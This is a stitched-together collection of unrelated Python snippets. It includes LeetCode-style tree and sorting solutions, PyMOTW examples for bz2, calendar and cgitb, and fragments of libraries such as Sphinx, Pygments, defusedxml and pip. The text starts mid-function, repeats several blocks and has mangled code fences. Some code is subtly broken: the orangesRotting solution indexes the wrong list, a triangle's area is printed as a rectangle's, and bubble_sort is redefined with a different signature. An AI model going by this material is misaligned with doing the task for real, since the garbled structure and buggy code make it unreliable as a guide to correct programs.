        yield from bt_inorder_traversal_recur(root.left)
        yield root
        yield from bt_inorder_traversal_recur(root.right)
````

````py
ID: b9cd1e0a-a238-44a7-8116-8ae959d38f29
https://leetcode.com/problems/binary-tree-inorder-traversal/```


```py
from collections.abc import Iterable
from typing import Optional

from src.typehints import BTNode


def bt_inorder_traversal_recur(root: Optional[BTNode]) -> Iterable[BTNode]:
    if root is not None:
        yield from bt_inorder_traversal_recur(root.left)
        yield root
        yield from bt_inorder_traversal_recur(root.right)
````

````py
ID: 6e122846-ff51-47ba-bf8a-e8d04dbdac3b
https://leetcode.com/problems/binary-tree-level-order-traversal/

The essential thing about level order traversal is the inner for loop over the length of the level.
Above that loop is where you can do any per-level operations. In this case, yielding a copy of the level.
You can use a stack instead of a queue by copying and replacing it on each level.```


```py
from collections import deque
from typing import Iterable

from src.typehints import BTNode


def bt_level_order_traversal_iter(root: BTNode) -> Iterable[list[BTNode]]:
    # would do a null check here if root was Optional
    level = deque([root])
    while level:
        # modify this line if you needed to grab the values
        yield list(level)  # copy so it's not messed with
        for _ in range(len(level)):
            node = level.popleft()
            for child in [node.left, node.right]:
                if child is not None:
                    level.append(child)
````

````py
ID: 6e122846-ff51-47ba-bf8a-e8d04dbdac3b
https://leetcode.com/problems/binary-tree-level-order-traversal/

The essential thing about level order traversal is the inner for loop over the length of the level.
Above that loop is where you can do any per-level operations. In this case, yielding a copy of the level.
You can use a stack instead of a queue by copying and replacing it on each level.```


```py
from collections import deque
from typing import Iterable

from src.typehints import BTNode


def bt_level_order_traversal_iter(root: BTNode) -> Iterable[list[BTNode]]:
    # would do a null check here if root was Optional
    level = deque([root])
    while level:
        # modify this line if you needed to grab the values
        yield list(level)  # copy so it's not messed with
        for _ in range(len(level)):
            node = level.popleft()
            for child in [node.left, node.right]:
                if child is not None:
                    level.append(child)
````

```py

https://en.wikipedia.org/wiki/Bubble_sort

Worst-case performance: O(N^2)

If you call bubble_sort(arr,True), you can see the process of the sort
Default is simulation = False
```

```py


def bubble_sort(arr, simulation=False):
    def swap(i, j):
        arr[i], arr[j] = arr[j], arr[i]

    n = len(arr)
    swapped = True

    iteration = 0
    if simulation:
        print("iteration", iteration, ":", *arr)
    x = -1
    while swapped:
        swapped = False
        x = x + 1
        for i in range(1, n - x):
            if arr[i - 1] > arr[i]:
                swap(i - 1, i)
                swapped = True
                if simulation:
                    iteration = iteration + 1
                    print("iteration", iteration, ":", *arr)

    return arr

# sample input : 4
#                 -1,0,3,57,89,9
# output        : -1,0,3,9,57,89


def bubble_sort(arr, n):
    for i in range(n):
        for j in range(0, n - i - 1):
            if arr[j] > arr[j + 1]:
                arr[j], arr[j + 1] = arr[j + 1], arr[j]
    return arr


arr = [64, 34, 25, 12, 22, 11, 90]

result = bubble_sort(arr, len(arr))

print(result)

def bucket_sort(arr):
    """ Bucket Sort
        Complexity: O(n^2)
        The complexity is dominated by nextSort
    """
    # The number of buckets and make buckets
    num_buckets = len(arr)
    buckets = [[] for bucket in range(num_buckets)]
    # Assign values into bucket_sort
    for value in arr:
        index = value * num_buckets // (max(arr) + 1)
        buckets[index].append(value)
    # Sort
    sorted_list = []
    for i in range(num_buckets):
        sorted_list.extend(next_sort(buckets[i]))
    return sorted_list


def next_sort(arr):
    # We will use insertion sort here.
    for i in range(1, len(arr)):
        j = i - 1
        key = arr[i]
        while arr[j] > key and j >= 0:
            arr[j + 1] = arr[j]
            j = j - 1
        arr[j + 1] = key
    return arr

def buddyStrings(A, B):
    if len(A) != len(B):
        return False
    elif A == B:
        seen = set()
        for char in A:
            if char in seen:
                return True
            seen.add(char)
        return False
    else:
        pairs = []
        for i in range(len(A)):
            if A[i] != B[i]:
                pairs.append([A[i], B[i]])
            if len(pairs) > 2:
                return False
        return len(pairs) == 2 and pairs[0] == pairs[1][::-1]


print(buddyStrings("ab", "ab"))
print(buddyStrings("aaa", "aaa"))

def isPalindrome(st):
    for i in range(len(st) // 2):
        if st[i] != st[len(st) - 1 - i]:
            return False
    return True


def buildPalindrome(st):
    for i in range(len(st)):
        substring = st[i : len(st)]
        if isPalindrome(substring):
            non_palindrome_part = st[0:i]
            return st + non_palindrome_part[::-1]
    return "String not found"
```

````py
    sphinx.util.build_phase
    ~~~~~~~~~~~~~~~~~~~~~~~

    Build phase of Sphinx application.

    :copyright: Copyright 2007-2021 by the Sphinx team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

from enum import IntEnum


class BuildPhase(IntEnum):
    """Build phase of Sphinx application."""

    INITIALIZATION = 1
    READING = 2
    CONSISTENCY_CHECK = 3
    RESOLVING = 3
    WRITING = 4

from heapq import heappop, heappush, heapify

heap = []
nums = [12, 3, -2, 6, 4, 8, 9]

# for num in nums:
#     heappush(heap, num)

# while heap:
#     print(heappop(heap))


heapify(nums)
print(nums)
````

````py
Lists builtin plugins.```


```py
plugins = []
builtins = (
    ("nose.plugins.attrib", "AttributeSelector"),
    ("nose.plugins.capture", "Capture"),
    ("nose.plugins.logcapture", "LogCapture"),
    ("nose.plugins.cover", "Coverage"),
    ("nose.plugins.debug", "Pdb"),
    ("nose.plugins.deprecated", "Deprecated"),
    ("nose.plugins.doctests", "Doctest"),
    ("nose.plugins.isolate", "IsolationPlugin"),
    ("nose.plugins.failuredetail", "FailureDetail"),
    ("nose.plugins.prof", "Profile"),
    ("nose.plugins.skip", "Skip"),
    ("nose.plugins.testid", "TestId"),
    ("nose.plugins.multiprocess", "MultiProcess"),
    ("nose.plugins.xunit", "Xunit"),
    ("nose.plugins.allmodules", "AllModules"),
    ("nose.plugins.collect", "CollectOnly"),
)

for module, cls in builtins:
    try:
        plugmod = __import__(module, globals(), locals(), [cls])
    except KeyboardInterrupt:
        raise
    except:
        continue
    plug = getattr(plugmod, cls)
    plugins.append(plug)
    globals()[cls] = plug

from __future__ import absolute_import, unicode_literals

from abc import ABCMeta

from six import add_metaclass

from virtualenv.create.creator import Creator
from virtualenv.create.describe import Describe


@add_metaclass(ABCMeta)
class VirtualenvBuiltin(Creator, Describe):
    """A creator that does operations itself without delegation, if we can create it we can also describe it"""

    def __init__(self, options, interpreter):
        Creator.__init__(self, options, interpreter)
        Describe.__init__(self, self.dest, interpreter)
````

````pyYet another implementation of bunch

attribute-access of items on a dict.```


```py

# Copyright (c) Jupyter Development Team.
# Distributed under the terms of the Modified BSD License.


class Bunch(dict):
    """A dict with attribute-access"""

    def __getattr__(self, key):
        try:
            return self.__getitem__(key)
        except KeyError:
            raise AttributeError(key)

    def __setattr__(self, key, value):
        self.__setitem__(key, value)

    def __dir__(self):
        # py2-compat: can't use super because dict doesn't have __dir__
        names = dir({})
        names.extend(self.keys())
        return names

# Create UI
display = []
buttons = []
for n in range(10):
    # A button is a function called when user clicks on it
    buttons.append(lambda n=n: display.append(n))  # <1>

# Click on button 3
btn = buttons[3]
btn()
print(display)

# Create UI
display = []
buttons = []


def make_button(n):
    return lambda: display.append(n)


for n in range(10):
    # A button is a function called when user clicks on it
    buttons.append(make_button(n))

# Click on button 3
btn = buttons[3]
btn()
print(display)
````

````py
    pygments.styles.bw
    ~~~~~~~~~~~~~~~~~~

    Simple black/white only style.

    :copyright: Copyright 2006-2021 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

from pygments.style import Style
from pygments.token import Keyword, Name, Comment, String, Error, Operator, Generic


class BlackWhiteStyle(Style):

    background_color = "#ffffff"
    default_style = ""

    styles = {
        Comment: "italic",
        Comment.Preproc: "noitalic",
        Keyword: "bold",
        Keyword.Pseudo: "nobold",
        Keyword.Type: "nobold",
        Operator.Word: "bold",
        Name.Class: "bold",
        Name.Namespace: "bold",
        Name.Exception: "bold",
        Name.Entity: "bold",
        Name.Tag: "bold",
        String: "italic",
        String.Interpol: "bold",
        String.Escape: "bold",
        Generic.Heading: "bold",
        Generic.Subheading: "bold",
        Generic.Emph: "italic",
        Generic.Strong: "bold",
        Generic.Prompt: "bold",
        Error: "border:#FF0000",
    }

```









---


```py


# end_pymotw_header
import bz2
import io
import os

data = open("lorem.txt", "r", encoding="utf-8").read() * 1024
print("Input contains {} bytes".format(len(data.encode("utf-8"))))

for i in range(1, 10):
    filename = "compress-level-{}.bz2".format(i)
    with bz2.BZ2File(filename, "wb", compresslevel=i) as output:
        with io.TextIOWrapper(output, encoding="utf-8") as enc:
            enc.write(data)
    os.system("cksum {}".format(filename))

```









---


```py


# end_pymotw_header
import bz2
import io

with bz2.BZ2File("example.bz2", "rb") as input:
    with io.TextIOWrapper(input, encoding="utf-8") as dec:
        print(dec.read())

```









---


```py


# end_pymotw_header
import bz2
import contextlib

with bz2.BZ2File("example.bz2", "rb") as input:
    print("Entire file:")
    all_data = input.read()
    print(all_data)

    expected = all_data[5:15]

    # rewind to beginning
    input.seek(0)

    # move ahead 5 bytes
    input.seek(5)
    print("Starting at position 5 for 10 bytes:")
    partial = input.read(10)
    print(partial)

    print()
    print(expected == partial)

```









---


```py


# end_pymotw_header
import bz2
import io
import os

data = "Contents of the example file go here.\n"

with bz2.BZ2File("example.bz2", "wb") as output:
    with io.TextIOWrapper(output, encoding="utf-8") as enc:
        enc.write(data)

os.system("file example.bz2")

```









---


```py


# end_pymotw_header
import bz2
import io
import itertools
import os

data = "The same line, over and over.\n"

with bz2.BZ2File("lines.bz2", "wb") as output:
    with io.TextIOWrapper(output, encoding="utf-8") as enc:
        enc.writelines(itertools.repeat(data, 10))

os.system("bzcat lines.bz2")

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyIncremental compression```


```py

# end_pymotw_header
import bz2
import binascii
import io

compressor = bz2.BZ2Compressor()

with open("lorem.txt", "rb") as input:
    while True:
        block = input.read(64)
        if not block:
            break
        compressed = compressor.compress(block)
        if compressed:
            print("Compressed: {}".format(binascii.hexlify(compressed)))
        else:
            print("buffering...")
    remaining = compressor.flush()
    print("Flushed: {}".format(binascii.hexlify(remaining)))

```









---


```py


# end_pymotw_header
import bz2

original_data = b"This is the original text."

fmt = "{:>15}  {:>15}"
print(fmt.format("len(data)", "len(compressed)"))
print(fmt.format("-" * 15, "-" * 15))

for i in range(5):
    data = original_data * i
    compressed = bz2.compress(data)
    print(fmt.format(len(data), len(compressed)), end="")
    print("*" if len(data) < len(compressed) else "")

```









---


```py


# end_pymotw_header
import bz2
import binascii

original_data = b"This is the original text."
print("Original     : {} bytes".format(len(original_data)))
print(original_data)

print()
compressed = bz2.compress(original_data)
print("Compressed   : {} bytes".format(len(compressed)))
hex_version = binascii.hexlify(compressed)
for i in range(len(hex_version) // 40 + 1):
    print(hex_version[i * 40 : (i + 1) * 40])

print()
decompressed = bz2.decompress(compressed)
print("Decompressed : {} bytes".format(len(decompressed)))
print(decompressed)

```









---


```py


# end_pymotw_header
import bz2

lorem = open("lorem.txt", "rt").read().encode("utf-8")
compressed = bz2.compress(lorem)
combined = compressed + lorem

decompressor = bz2.BZ2Decompressor()
decompressed = decompressor.decompress(combined)

decompressed_matches = decompressed == lorem
print("Decompressed matches lorem:", decompressed_matches)

unused_matches = decompressor.unused_data == lorem
print("Unused data matches lorem :", unused_matches)

# Copyright (c) 2015 Doug Hellmann All rights reserved.
#```


```pyWrite and read unicode data to a file.```


```py

# end_pymotw_header
import bz2
import os

data = "Character with an åccent."

with bz2.open("example.bz2", "wt", encoding="utf-8") as output:
    output.write(data)

with bz2.open("example.bz2", "rt", encoding="utf-8") as input:
    print("Full file: {}".format(input.read()))

# Move to the beginning of the accented character.
with bz2.open("example.bz2", "rt", encoding="utf-8") as input:
    input.seek(18)
    print("One character: {}".format(input.read(1)))

# Move to the middle of the accented character.
with bz2.open("example.bz2", "rt", encoding="utf-8") as input:
    input.seek(19)
    try:
        print(input.read(1))
    except UnicodeDecodeError:
        print("ERROR: failed to decode")

# defusedxml
#
# Copyright (c) 2013 by Christian Heimes <christian@python.org>
# Licensed to PSF under a Contributor Agreement.
# See https://www.python.org/psf/license for licensing details.```


```pyDefused xml.etree.cElementTree```


```py
from __future__ import absolute_import

import warnings

from .common import _generate_etree_functions

from xml.etree.cElementTree import TreeBuilder as _TreeBuilder
from xml.etree.cElementTree import parse as _parse
from xml.etree.cElementTree import tostring

# iterparse from ElementTree!
from xml.etree.ElementTree import iterparse as _iterparse

# This module is an alias for ElementTree just like xml.etree.cElementTree
from .ElementTree import (
    XML,
    XMLParse,
    XMLParser,
    XMLTreeBuilder,
    fromstring,
    iterparse,
    parse,
    tostring,
    DefusedXMLParser,
    ParseError,
)

__origin__ = "xml.etree.cElementTree"


warnings.warn(
    "defusedxml.cElementTree is deprecated, import from defusedxml.ElementTree instead.",
    category=DeprecationWarning,
    stacklevel=2,
)

# XMLParse is a typo, keep it for backwards compatibility
XMLTreeBuilder = XMLParse = XMLParser = DefusedXMLParser

parse, iterparse, fromstring = _generate_etree_functions(
    DefusedXMLParser, _TreeBuilder, _parse, _iterparse
)
XML = fromstring

__all__ = [
    "ParseError",
    "XML",
    "XMLParse",
    "XMLParser",
    "XMLTreeBuilder",
    "fromstring",
    "iterparse",
    "parse",
    "tostring",
]
````

````py
The cache object API for implementing caches. The default is a thread
safe in-memory dictionary.```


```py
from threading import Lock


class BaseCache(object):
    def get(self, key):
        raise NotImplementedError()

    def set(self, key, value):
        raise NotImplementedError()

    def delete(self, key):
        raise NotImplementedError()

    def close(self):
        pass


class DictCache(BaseCache):
    def __init__(self, init_dict=None):
        self.lock = Lock()
        self.data = init_dict or {}

    def get(self, key):
        return self.data.get(key, None)

    def set(self, key, value):
        with self.lock:
            self.data.update({key: value})

    def delete(self, key):
        with self.lock:
            if key in self.data:
                self.data.pop(key)

# Author: PrajaktaSathe
# Program to calculate the area of - square, rectangle, circle, and triangle -
shape = int(
    input("Enter 1 for square, 2 for rectangle, 3 for circle, or 4 for triangle: ")
)
if shape == 1:
    side = float(input("Enter length of side: "))
    print("Area of square = " + str(side ** 2))
elif shape == 2:
    l = float(input("Enter length: "))
    b = float(input("Enter breadth: "))
    print("Area of rectangle = " + str(l * b))
elif shape == 3:
    r = float(input("Enter radius: "))
    print("Area of circle = " + str(3.14 * r * r))
elif shape == 4:
    base = float(input("Enter base: "))
    h = float(input("Enter height: "))
    print("Area of rectangle = " + str(0.5 * base * h))
else:
    print("You have selected wrong choice.")
````

````py
Calculate Area of Polygon

Given ordered coordinates of a polygon with n vertices. Find area of the polygon.
Here ordered mean that the coordinates are given either in clockwise manner or anticlockwise from first vertex to last.

Input: [(0, 0), (3, 0), (3, 2), (0, 2)]
Output: 6.0
Output explanation: The polygon is a 3x2 rectangle parallel with the X axis. The area is 6 (3*2).

=========================================
Use Shoelace formula (https://en.wikipedia.org/wiki/Shoelace_formula).
abs( 1/2 ((X1Y2 + X2Y3 + ... + Xn-1Yn + XnY1) - (X2Y1 + X3Y2 + ... + XnYn-1 + X1Yn)) )
    Time Complexity:    O(N)
    Space Complexity:   O(1)```


```py


############
# Solution #
############


def calculate_area_of_polygon(polygon):
    n = len(polygon)
    prev = polygon[-1]
    area = 0

    for curr in polygon:
        area += (prev[0] + curr[0]) * (prev[1] - curr[1])
        prev = curr

    return abs(area / 2)  # return absolute value


###########
# Testing #
###########

# Test 1
# Correct result => 6.0
print(calculate_area_of_polygon([(0, 0), (3, 0), (3, 2), (0, 2)]))

formation_num = 32  # defining no of signs, we are using it on on multiple places
print("*" * formation_num)  # for formation

title = "   A simple python calculator"
print(title)
print("-" * formation_num)  # for formation

num1 = float(input("   Type first number: "))
num2 = float(input("   Type second number: "))
operator = input("   Type operator: ")

addition = num1 + num2
subtraction = num1 - num2
multiplication = num1 * num2
division = num1 / num2

if operator == "+":
    print(f"   Result: {num1} + {num2} = {addition}")
elif operator == "-":
    print(f"   Result: {num1} - {num2} = {subtraction}")
elif operator == "*":
    print(f"   Result: {num1} * {num2} = {multiplication}")
elif operator == "/":
    print(f"   Result: {num1} / {num2} = {division}")
else:
    print("   Sorry! unrecognizable operator")

print("*" * formation_num)  # for formation

# Program make a simple calculator
def add(x, y):
    return x + y


def subtract(x, y):
    return x - y


def multiply(x, y):
    return x * y


def divide(x, y):
    return x / y


print("Select operation.")
print("1.Add")
print("2.Subtract")
print("3.Multiply")
print("4.Divide")

while True:
    # Take input from the user
    choice = input("Enter choice(1/2/3/4): ")

    # Check if choice is one of the four options
    if choice in ("1", "2", "3", "4"):
        num1 = float(input("Enter first number: "))
        num2 = float(input("Enter second number: "))

        if choice == "1":
            print(num1, "+", num2, "=", add(num1, num2))

        elif choice == "2":
            print(num1, "-", num2, "=", subtract(num1, num2))

        elif choice == "3":
            print(num1, "*", num2, "=", multiply(num1, num2))

        elif choice == "4":
            print(num1, "/", num2, "=", divide(num1, num2))
        break
    else:
        print("Invalid Input")

# calender viewer
import sys
import calendar

# function to view calendar
viewCalender = lambda yy, mm: print("\n\n Calendar > \n %s\n" % calendar.month(yy, mm))

# UI
while True:
    if str(input("[+] Start [Y/n] ?  ")).strip().lower() == "y":
        try:
            viewCalender(int(input("\nYear: ")), int(input("Month: ")))
        except IndexError:
            print("  -> Try Again! With valid numbers!\n")
    else:
        print("\nSee Ya Soon!")
        sys.exit(0)

#!/usr/bin/env python3```


```pyPrint entire year calendar.```


```py
# end_pymotw_header
import calendar

cal = calendar.TextCalendar(calendar.SUNDAY)
print(cal.formatyear(2017, 2, 1, 1, 3))

#!/usr/bin/env python3```


```pySample of TextCalendar output.```


```py
# end_pymotw_header
import calendar

c = calendar.HTMLCalendar(calendar.SUNDAY)
print(c.formatmonth(2017, 7))

#!/usr/bin/env python3```


```pySample of TextCalendar output.```


```py
# end_pymotw_header
import calendar

c = calendar.LocaleTextCalendar(locale="en_US")
c.prmonth(2017, 7)

print()

c = calendar.LocaleTextCalendar(locale="fr_FR")
c.prmonth(2017, 7)

#!/usr/bin/env python3```


```pyShow the dates in each week of a month.```


```py
# end_pymotw_header
import calendar
import pprint

pprint.pprint(calendar.monthcalendar(2017, 7))

#!/usr/bin/env python3```


```pyShow second Thursdays.

Print a list of the dates for the 2nd Thursday of every month
for a year.
````

````py
# end_pymotw_header
import calendar
import sys

year = int(sys.argv[1])

# Show every month
for month in range(1, 13):

    # Compute the dates for each week that overlaps the month
    c = calendar.monthcalendar(year, month)
    first_week = c[0]
    second_week = c[1]
    third_week = c[2]

    # If there is a Thursday in the first week,
    # the second Thursday is # in the second week.
    # Otherwise, the second Thursday must be in
    # the third week.
    if first_week[calendar.THURSDAY]:
        meeting_date = second_week[calendar.THURSDAY]
    else:
        meeting_date = third_week[calendar.THURSDAY]

    print("{:>3}: {:>2}".format(calendar.month_abbr[month], meeting_date))

#!/usr/bin/env python3```


```pySample of TextCalendar output.```


```py
# end_pymotw_header
import calendar

c = calendar.TextCalendar(calendar.SUNDAY)
c.prmonth(2017, 7)

#!/usr/bin/env python3```


```pyShow the yeardays2calendar return value.```


```py
# end_pymotw_header
import calendar
import pprint

cal = calendar.Calendar(calendar.SUNDAY)

cal_data = cal.yeardays2calendar(2017, 3)
print("len(cal_data)      :", len(cal_data))

top_months = cal_data[0]
print("len(top_months)    :", len(top_months))

first_month = top_months[0]
print("len(first_month)   :", len(first_month))

print("first_month:")
pprint.pprint(first_month, width=65)

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

x = abs(100)
y = abs(-20)
print(x, y)
print("max(1, 2, 3) =", max(1, 2, 3))
print("min(1, 2, 3) =", min(1, 2, 3))
print("sum([1, 2, 3]) =", sum([1, 2, 3]))
````

```pyA set of basic callbacks for bleach.linkify."""


def nofollow(attrs, new=False):
    href_key = (None, "href")

    if href_key not in attrs:
        return attrs

    if attrs[href_key].startswith("mailto:"):
        return attrs

    rel_key = (None, "rel")
    rel_values = [val for val in attrs.get(rel_key, "").split(" ") if val]
    if "nofollow" not in [rel_val.lower() for rel_val in rel_values]:
        rel_values.append("nofollow")
    attrs[rel_key] = " ".join(rel_values)

    return attrs


def target_blank(attrs, new=False):
    href_key = (None, "href")

    if href_key not in attrs:
        return attrs

    if attrs[href_key].startswith("mailto:"):
        return attrs

    attrs[(None, "target")] = "_blank"
    return attrs

from pip._vendor.packaging.version import parse as parse_version

from pip._internal.models.link import Link
from pip._internal.utils.models import KeyBasedCompareMixin


class InstallationCandidate(KeyBasedCompareMixin):
    """Represents a potential "candidate" for installation.
    """

    __slots__ = ["name", "version", "link"]

    def __init__(self, name: str, version: str, link: Link) -> None:
        self.name = name
        self.version = parse_version(version)
        self.link = link

        super().__init__(
            key=(self.name, self.version, self.link),
            defining_class=InstallationCandidate,
        )

    def __repr__(self) -> str:
        return "<InstallationCandidate({!r}, {!r}, {!r})>".format(
            self.name, self.version, self.link
        )

    def __str__(self) -> str:
        return "{!r} candidate (version {} at {})".format(
            self.name, self.version, self.link
        )

from string import ascii_lowercase, ascii_uppercase


def capitalize(sentence: str) -> str:
    """
    This function will capitalize the first letter of a sentence or a word
    >>> capitalize("hello world")
    'Hello world'
    >>> capitalize("123 hello world")
    '123 hello world'
    >>> capitalize(" hello world")
    ' hello world'
    >>> capitalize("a")
    'A'
    >>> capitalize("")
    ''
    """
    if not sentence:
        return ""
    lower_to_upper = {lc: uc for lc, uc in zip(ascii_lowercase, ascii_uppercase)}
    return lower_to_upper.get(sentence[0], sentence[0]) + sentence[1:]


if __name__ == "__main__":
    from doctest import testmod

    testmod()
```

```py
Aim: To replace the first character of all the words with their upper case characters.
```

```py

# Complete the solve function below.
def solve(s):
    # splitting the string into words
    for x in s[:].split():
        # replacing the character with it's capital form
        s = s.replace(x, x.capitalize())
    print("Updated string:", s)


# getting the input
s = input("Enter string: ")
# calling function to compute the result
solve(s)
```

```py
COMPLEXITY:

  Time Complexity -> O(N)
  Space Complexity -> O(N)

Sample Input:
Enter string: summer of code

Sample Output:
Updated string: Summer Of Code

Explanation:
All the initial characters of the words are capitalized.
```

```py

import re


def get_file_content(include_tag):
    file_name = include_tag.split(" ")[1].replace('"', "")
    return open(file_name).read()


def main():
    """
    Lets dont worry about the program
    Its basically replacing <include file.svg> with its file content
    in the same file and produces final_car.svg as output
    This is purely to show, how we can work with multiple files in out git repository.
    """
    with open("car_assemble.svg") as file:  # reading source file car_assemble.svg
        file_content = file.read()

        regex = r"<include .*svg\" />"  # finding pattern <include file.svg>
        matches = re.finditer(regex, file_content, re.MULTILINE)

        for matchNum, match in enumerate(
            matches, start=1
        ):  # Replace each occurence of <include file.svg> with the contents of file.svg
            include_tag = match.group().strip()
            include_content = get_file_content(include_tag)
            file_content = file_content.replace(match.group(), include_content)

        with open(
            "final_car.svg", "w"
        ) as f:  # finally writing everything into final_car.svg
            f.write(file_content)


main()  # Running main() when file is executed by "python car_assembler.py"
```

````pyWrite a class named Car that has the following data attribute:
 speed(for the car's current speed)
The Car class should have an __init__ method that initialises(assigns) the speed data attribute to 0.
The class should also have the following methods:
 accelerate
The accelerate method should add 5 to the speed data attribute each time it is called.
 brake
The brake method should subtract 5 from the speed data attribute each time it is called.
 get_speed
The get_speed method should return the current speed.
Write a program that creates a Car object and then calls the accelerate method five times. After each call to
the accelerate method, get the current speed of the car(call the get_speed method) and display it. Then
call the brake method five times. After each call to the brake method, get the current speed of the car and
display it.```


```py


class Car:
    def __init__(self, speed=0):
        self.speed = speed

    # methods
    # add 5 to speed every call
    def accelerate(self):
        self.speed = self.speed + 5

    # subtract 5 from speed every call
    def brake(self):
        self.speed = self.speed - 5

    # getter
    def get_speed(self):
        return self.speed


# Initialze the car
car = Car()

# call the speed 5 times
for i in range(5):
    car.accelerate()

print("Current speed after five accelerations:", car.get_speed())

# call the break 5 times
for i in range(5):
    car.brake()

print("Current speed after five breaks:", car.get_speed())

# quadrant determiner
# I(+,+) II(-,+) III(-,-) IV(+,-)


def determine_quadrant(x, y):
    try:
        if x > 0 and y > 0:
            return "I(+,+)"
        elif x < 0 and y > 0:
            return "II(-,+)"
        elif x < 0 and y < 0:
            return "III(-,-)"
        elif x > 0 and y < 0:
            return "IV(+,-)"
        else:
            return "Invalid parameters were provided"
    except TypeError:
        return "X and Y co-ords must be integers and not X {}, Y{}".format(
            type(x), type(y)
        )


# Test
result = determine_quadrant(
    float(input("X co-ordinate: ")), float(input("Y co-ordinate: "))
)
print("Quadrant is " + result)

def caseUnification(s):
    u = sum(1 for x in s if x.isupper())
    if u > (len(s) / 2):
        return s.upper()
    else:
        return s.lower()
````

````py
https://en.wikipedia.org/wiki/Floor_and_ceiling_functions```


```py


def ceil(x) -> int:
    """
    Return the ceiling of x as an Integral.

    :param x: the number
    :return: the smallest integer >= x.

    >>> import math
    >>> all(ceil(n) == math.ceil(n) for n
    ...     in (1, -1, 0, -0, 1.1, -1.1, 1.0, -1.0, 1_000_000_000))
    True
    """
    return int(x) if x - int(x) <= 0 else int(x) + 1


if __name__ == "__main__":
    import doctest

    doctest.testmod()

def orangesRotting(elemnts):
    if not elemnts or len(elemnts) == 0:
        return 0
    n = len(elemnts)
    m = len(elemnts[0])
    rotten = []
    for i in range(n):
        for j in range(m):
            if elemnts[i][j] == 2:
                rotten.append((i, j))
    mins = 0

    def dfs(rotten):
        count = []
        for i, j in rotten:
            if i > 0 and rotten[i - 1][j] == 1:
                count.append((i - 1, j))
                elemnts[i - 1][j] = 2

            if j > 0 and rotten[i][j - 1] == 1:
                count.append((i, j - 1))
                elemnts[i][j - 1] = 2

            if i < n - 1 and rotten[i][j] == 1:
                count.append((i, j))
                elemnts[i][j] = 2

            if j < m - 1 and rotten[i][j] == 1:
                count.append((i, j))
                elemnts[i][j] = 2

        return count

    while rotten:
        rotten = dfs(rotten)
        if not rotten:
            break
        mins += 1

    for i in range(n):
        for j in range(m):
            if elemnts[i][j] == 1:
                return -1

    return mins
````

````py
ID: 834cdcc9-ff3e-497c-884e-8bf6a93a90c1
Python Algorithms, Page 80
https://leetcode.com/problems/find-the-celebrity/```


```py
from collections.abc import Callable
from typing import Optional


def celebrity(knows: Callable[[int, int], bool], n: int) -> Optional[int]:
    candidate = 0
    for node in range(1, n):
        if knows(candidate, node):
            candidate = node
    if any(knows(candidate, node) for node in range(candidate)):
        return None
    if any(not knows(node, candidate) for node in range(n)):
        return None
    return candidate
````

````py
ID: 834cdcc9-ff3e-497c-884e-8bf6a93a90c1
Python Algorithms, Page 80
https://leetcode.com/problems/find-the-celebrity/```


```py
from collections.abc import Callable
from typing import Optional


def celebrity(knows: Callable[[int, int], bool], n: int) -> Optional[int]:
    candidate = 0
    for node in range(1, n):
        if knows(candidate, node):
            candidate = node
    if any(knows(candidate, node) for node in range(candidate)):
        return None
    if any(not knows(node, candidate) for node in range(n)):
        return None
    return candidate

def centuryFromYear(year):
    if year % 100 == 0:
        return year // 100
    else:
        return (year // 100) + 1

#!/usr/bin/env python
# -*- coding: utf-8 -*-
````

````py
requests.certs
~~~~~~~~~~~~~~

This module returns the preferred default CA certificate bundle. There is
only one — the one from the certifi package.

If you are packaging Requests, e.g., for a Linux distribution or a managed
environment, you can change the definition of where() to return a separately
packaged CA bundle.```


```py
from pip._vendor.certifi import where

if __name__ == "__main__":
    print(where())

# Copyright (c) 2009 Doug Hellmann.  All rights reserved.
#```


```pyGenerate a traceback```


```py

# end_pymotw_header
def func2(a, divisor):
    return a / divisor


def func1(a, b):
    c = b - 5
    return func2(a, c)


func1(1, 5)

# Copyright (c) 2009 Doug Hellmann.  All rights reserved.
#```


```pyShowing exception properties in a traceback```


```py

# end_pymotw_header
import cgitb

cgitb.enable(format="text")


class MyException(Exception):
    """Add extra properties to a special exception
    """

    def __init__(self, message, bad_value):
        self.bad_value = bad_value
        Exception.__init__(self, message)
        return


raise MyException("Normal message", bad_value=99)

# Copyright (c) 2009 Doug Hellmann.  All rights reserved.
#```


```pyGenerate a traceback with more details.```


```py

# end_pymotw_header
import cgitb

cgitb.enable(format="text")


def func1(arg1):
    local_var = arg1 * 2
    return func2(local_var)


def func2(arg2):
    local_var = arg2 + 2
    return func3(local_var)


def func3(arg3):
    local_var = arg2 / 2  # noqa
    return local_var


func1(1)

# Copyright (c) 2009 Doug Hellmann.  All rights reserved.
#```


```pyGenerate a traceback with more details.```


```py

# end_pymotw_header
import cgitb

cgitb.enable()


def func1(arg1):
    local_var = arg1 * 2
    return func2(local_var)


def func2(arg2):
    local_var = arg2 + 2
    return func3(local_var)


def func3(arg3):
    local_var = arg2 / 2  # noqa
    return local_var


func1(1)

# Copyright (c) 2009 Doug Hellmann.  All rights reserved.
#```


```pyLocal variables lead to an answer```


```py

# end_pymotw_header
import cgitb

cgitb.enable(format="text")


def func2(a, divisor):
    return a / divisor


def func1(a, b):
    c = b - 5
    return func2(a, c)


func1(1, 5)

# Copyright (c) 2009 Doug Hellmann.  All rights reserved.
#```


```pyLogging exceptions to a file, instead of displaying them.```


```py

# end_pymotw_header
import cgitb
import os

LOGDIR = os.path.join(os.path.dirname(__file__), "LOGS")

if not os.path.exists(LOGDIR):
    os.makedirs(LOGDIR)

cgitb.enable(logdir=LOGDIR, display=False, format="text")


def func(a, divisor):
    return a / divisor


func(1, 0)

# Copyright (c) 2009 Doug Hellmann.  All rights reserved.
#```


```pyControl the context by passing a number on command line```


```py

# end_pymotw_header
import cgitb
import sys

context_length = int(sys.argv[1])
cgitb.enable(format="text", context=context_length)


def func2(a, divisor):
    return a / divisor


def func1(a, b):
    c = b - 5
    # Really
    # long
    # comment
    # goes
    # here.
    return func2(a, c)


func1(1, 5)

# Copyright (c) 2009 Doug Hellmann.  All rights reserved.
#```


```pyShow tracebacks with classes```


```py

# end_pymotw_header
import cgitb

cgitb.enable(format="text", context=12)


class BrokenClass:
    """This class has an error.
    """

    def __init__(self, a, b):
        """Be careful passing arguments in here.
        """
        self.a = a
        self.b = b
        self.c = self.a * self.b
        # Really
        # long
        # comment
        # goes
        # here.
        self.d = self.a / self.b
        return


o = BrokenClass(1, 0)

from PIL import Image


